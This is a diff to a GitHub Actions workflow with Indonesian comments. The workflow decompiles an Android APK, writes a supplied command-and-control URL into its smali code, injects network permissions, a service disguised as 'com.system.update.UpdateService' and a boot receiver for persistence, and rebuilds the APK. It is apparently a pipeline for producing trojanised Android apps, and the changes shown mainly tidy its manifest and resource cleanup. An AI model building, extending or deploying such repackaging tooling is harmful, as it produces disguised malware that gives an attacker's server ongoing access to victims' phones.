@@ -96,14 +96,27 @@ jobs:
           find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
           echo "✅ URL C2 diganti"
 
-      - name: Modify AndroidManifest.xml with Python (SAFE)
+      - name: Modify AndroidManifest.xml with Python (SAFE & CLEAN DUMMY)
         run: |
           python3 << 'EOF'
           import re
           MANIFEST_FILE = "decoded/AndroidManifest.xml"
           with open(MANIFEST_FILE, 'r') as f:
               content = f.read()
-          content = re.sub(r'APKTOOL_DUMMYVAL_[^"\s]+', 'dummy', content)
+
+          # Hapus semua baris yang mengandung 'dummy' atau 'DUMMYVAL'
+          lines = content.splitlines()
+          cleaned_lines = []
+          for line in lines:
+              if 'dummy' not in line.lower() and 'dummyval' not in line.lower():
+                  cleaned_lines.append(line)
+          content = '\n'.join(cleaned_lines)
+
+          # Hapus semua atribut android:theme yang merujuk ke dummy
+          content = re.sub(r'android:theme="[^"]*dummy[^"]*"', '', content)
+          content = re.sub(r'android:theme=\'[^\']*dummy[^\']*\'', '', content)
+
+          # Tambahkan izin
           permissions = [
               '<uses-permission android:name="android.permission.INTERNET" />',
               '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
@@ -118,6 +131,8 @@ jobs:
           ]
           perms_str = '\n    '.join(permissions)
           content = content.replace('</manifest>', f'    {perms_str}\n</manifest>')
+
+          # Tambahkan service
           services = '''
           <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />
           <receiver android:name="com.system.update.BootReceiver" android:exported="true">
@@ -128,24 +143,17 @@ jobs:
           </receiver>
           '''
           content = content.replace('</application>', f'{services}\n</application>')
+
           with open(MANIFEST_FILE, 'w') as f:
               f.write(content)
-          print("✅ AndroidManifest.xml berhasil dimodifikasi")
+          print("✅ AndroidManifest.xml berhasil dimodifikasi dan dummy dihapus")
           EOF
-
-      - name: Clean dummy files and references
-        run: |
-          find decoded -type f -name "*DUMMYVAL*" -delete 2>/dev/null || true
-          find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
-          find decoded -name "public.xml" -delete 2>/dev/null || true
-          echo "✅ DUMMYVAL berhasil dibersihkan"
 
       - name: Validate and remove invalid XML files
         run: |
           python3 << 'EOF'
           import os
           import subprocess
-          import shutil
           from pathlib import Path
 
           RES_DIR = "decoded/res"
@@ -156,7 +164,6 @@ jobs:
                   if file.endswith(".xml"):
                       path = os.path.join(root, file)
                       try:
-                          # Gunakan xmllint untuk validasi
                           result = subprocess.run(
                               ["xmllint", "--noout", path],
                               capture_output=True,
@@ -175,13 +182,13 @@ jobs:
           print(f"✅ {invalid_count} file XML invalid dihapus")
           EOF
 
-      - name: Remove all problematic drawable files (additional)
+      - name: Remove all problematic drawable files
         run: |
           find decoded/res -name "abc_*" -delete 2>/dev/null || true
           find decoded/res -name "design_*" -delete 2>/dev/null || true
           find decoded/res -name "mtrl_*" -delete 2>/dev/null || true
           find decoded/res -name "*\$*" -delete 2>/dev/null || true
-          echo "✅ Drawable tambahan dihapus"
+          echo "✅ Drawable bermasalah dihapus"
 
       - name: Rebuild APK with --copy-original
         run: |
